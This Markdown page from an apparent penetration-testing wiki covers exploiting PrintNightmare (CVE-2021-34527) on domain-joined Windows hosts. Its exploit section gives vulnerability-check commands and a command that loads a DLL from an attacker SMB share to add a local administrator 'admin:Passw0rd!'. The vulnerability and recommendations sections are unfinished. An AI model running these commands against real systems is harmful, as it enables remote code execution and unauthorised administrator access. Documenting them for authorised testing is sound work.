---
layout: default
title: PrintNightmare [CVE-2021-34527]
parent: Active Directory
nav_order: 14
permalink: /ad/printnightmare/
---

# PrintNightmare [CVE-2021-34527]
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---


## Vulnerability

TODO

## Prerequisites

- Low privileged domain account.
- Target must be an unpatched domain joined Windows computer.

## Exploit

You can check your target is vulnerable to PrintNightmare with `CrackMapExec` or `Nessus`.

```bash
cme smb $TARGET -d $DOMAIN -u $USERNAME -p $PASSWORD -M printnightmare
```

If the command above states the target is vulnerable, you can use the corresponding [Github repository](https://github.com/ly4k/PrintNightmare) to try the exploit.

To do so, you will might need to expose a share locally on your environement if you are not able to put the DLL directly on the target or anywhere else accessible by the target. You can follow [this tutorial](https://subba-lakshmi.medium.com/create-a-network-share-in-linux-using-samba-via-cli-and-access-using-samba-client-46ae16a012c3) to install `samba` and expose a SMB share on the network.

You will also need to find or code the DLL you want to execute on the target. Following [add_user.dll](https://github.com/ly4k/SpoolFool/blob/main/AddUser.dll) from `SpoolFool` repository can be used to add a local administrator `admin:Passw0rd!` on the target.

```bash
# Check if the target is vulnerable a second time
./printnightmare.py -check '$DOMAIN/$USERNAME:$PASSWORD@$TARGET'

# Exploit it!
./printnightmare.py -dll '\\$LHOST\smb\add_user.dll' '$DOMAIN/$USERNAME:$PASSWORD@$TARGET'

# List loaded drivers to check if the exploit worked
./printnightmare.py -list '$DOMAIN/$USERNAME:$PASSWORD@$TARGET'

# Delete the loaded driver
./printnightmare.py -delete -name 'Microsoft XPS Document Writer v5' '$DOMAIN/$USERNAME:$PASSWORD@$TARGET'
```

## Recommendations

TODO